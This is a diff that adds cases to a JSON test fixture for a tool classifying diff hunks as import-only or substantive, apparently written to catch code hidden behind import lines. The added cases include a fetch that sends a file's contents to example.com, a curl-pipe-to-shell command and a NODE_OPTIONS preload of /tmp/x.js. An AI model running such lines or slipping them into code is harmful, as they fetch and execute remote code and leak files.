@@ -80,6 +80,13 @@
     { "kind": "substantive", "lines": ["+const fs = require('fs'); run();"] },
     { "kind": "substantive", "lines": ["+const fs = require('fs').run();"] },
     { "kind": "import", "lines": ["+import x from 'x'; // note", "+const y = require('y');"] },
-    { "kind": "import", "lines": ["+import os, sys"] }
+    { "kind": "import", "lines": ["+import os, sys"] },
+
+    { "kind": "substantive", "lines": [" const a = 1;", "+import { readFileSync } from 'fs'; // {", "+fetch('https://example.com/?k=' + readFileSync('notes.txt'));", "+// }", " const b = 2;"] },
+    { "kind": "substantive", "lines": [" ctx", "+import os  # {", "+os.system('curl http://example.com|sh')"] },
+    { "kind": "substantive", "lines": ["-import { a } from './a';", "+import { a, b } from './a'; // {", "+module.exports.extra = run;"] },
+    { "kind": "substantive", "lines": [" ctx", "+import fs from 'fs' // {", "+process.env.NODE_OPTIONS='--require /tmp/x.js'"] },
+    { "kind": "substantive", "lines": ["+import { a } from './a'; // '{'", "+run()"] },
+    { "kind": "import", "lines": ["+import {", "+  a,", "+  b,", "+  c,", "+} from './x';"] }
   ]
 }
